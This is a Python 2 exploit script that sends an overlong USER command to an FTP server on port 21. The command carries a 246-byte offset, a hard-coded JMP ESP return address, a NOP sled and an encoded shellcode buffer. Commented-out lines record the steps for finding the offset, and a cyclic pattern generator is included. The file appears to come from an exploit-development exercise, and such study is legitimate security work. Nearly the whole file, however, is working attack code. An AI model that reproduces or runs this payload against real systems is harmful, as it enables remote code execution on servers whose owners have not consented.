import sys
import socket
def genPattern (n): # return n bytes of the pattern
    result = ""
    for l1 in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        for l2 in "abcdefghijklmnopqrstuvwxyz":
            for l3 in "0123456789":
                result += (l1 + l2 + l3)
    return result[0:n]

buf =  ""
buf += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\x9c\xa6\x17\x8f\x83\xeb\xfc\xe2\xf4\x60\x4e\x95\x8f"
buf += "\x9c\xa6\x77\x06\x79\x97\xd7\xeb\x17\xf6\x27\x04\xce"
buf += "\xaa\x9c\xdd\x88\x2d\x65\xa7\x93\x11\x5d\xa9\xad\x59"
buf += "\xbb\xb3\xfd\xda\x15\xa3\xbc\x67\xd8\x82\x9d\x61\xf5"
buf += "\x7d\xce\xf1\x9c\xdd\x8c\x2d\x5d\xb3\x17\xea\x06\xf7"
buf += "\x7f\xee\x16\x5e\xcd\x2d\x4e\xaf\x9d\x75\x9c\xc6\x84"
buf += "\x45\x2d\xc6\x17\x92\x9c\x8e\x4a\x97\xe8\x23\x5d\x69"
buf += "\x1a\x8e\x5b\x9e\xf7\xfa\x6a\xa5\x6a\x77\xa7\xdb\x33"
buf += "\xfa\x78\xfe\x9c\xd7\xb8\xa7\xc4\xe9\x17\xaa\x5c\x04"
buf += "\xc4\xba\x16\x5c\x17\xa2\x9c\x8e\x4c\x2f\x53\xab\xb8"
buf += "\xfd\x4c\xee\xc5\xfc\x46\x70\x7c\xf9\x48\xd5\x17\xb4"
buf += "\xfc\x02\xc1\xce\x24\xbd\x9c\xa6\x7f\xf8\xef\x94\x48"
buf += "\xdb\xf4\xea\x60\xa9\x9b\x59\xc2\x37\x0c\xa7\x17\x8f"
buf += "\xb5\x62\x43\xdf\xf4\x8f\x97\xe4\x9c\x59\xc2\xdf\xcc"
buf += "\xf6\x47\xcf\xcc\xe6\x47\xe7\x76\xa9\xc8\x6f\x63\x73"
buf += "\x80\xe5\x99\xce\x1d\x8f\x9e\xad\x7f\x8d\x9c\xb7\x4b"
buf += "\x06\x7a\xcc\x07\xd9\xcb\xce\x8e\x2a\xe8\xc7\xe8\x5a"
buf += "\x19\x66\x63\x83\x63\xe8\x1f\xfa\x70\xce\xe7\x3a\x3e"
buf += "\xf0\xe8\x5a\xf4\xc5\x7a\xeb\x9c\x2f\xf4\xd8\xcb\xf1"
buf += "\x26\x79\xf6\xb4\x4e\xd9\x7e\x5b\x71\x48\xd8\x82\x2b"
buf += "\x8e\x9d\x2b\x53\xab\x8c\x60\x17\xcb\xc8\xf6\x41\xd9"
buf += "\xca\xe0\x41\xc1\xca\xf0\x44\xd9\xf4\xdf\xdb\xb0\x1a"
buf += "\x59\xc2\x06\x7c\xe8\x41\xc9\x63\x96\x7f\x87\x1b\xbb"
buf += "\x77\x70\x49\x1d\xe7\x3a\x3e\xf0\x7f\x29\x09\x1b\x8a"
buf += "\x70\x49\x9a\x11\xf3\x96\x26\xec\x6f\xe9\xa3\xac\xc8"
buf += "\x8f\xd4\x78\xe5\x9c\xf5\xe8\x5a"
passwd="anything"
hostname = sys.argv[1]
jmpesp = '\x20\x10\xB4\x7C'
nopsled = "\x90"*16

# username = 'A'*768 
# username = 'A'*246 + 'B'*4
# username = 'A'*246 + jmpesp
username = 'A'*246 + jmpesp + nopsled + buf + 'C'*(768 - 246 - 20 - len(buf))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# First, connect, wrapping in exception-handling code.
try:
    sock.connect((hostname, 21)) # The ftp port
except:
    print ('[-] Connection error!')
    sys.exit(1)

r = sock.recv(1024) # response
print "[+] " + r

# now, send username and password across the connection
sock.send("user %s\r\n" %username)
r = sock.recv(1024)
print "[+] " + r

sock.send("pass %s\r\n" %passwd)
r = sock.recv(1024)
print "[+] " + r

sock.close()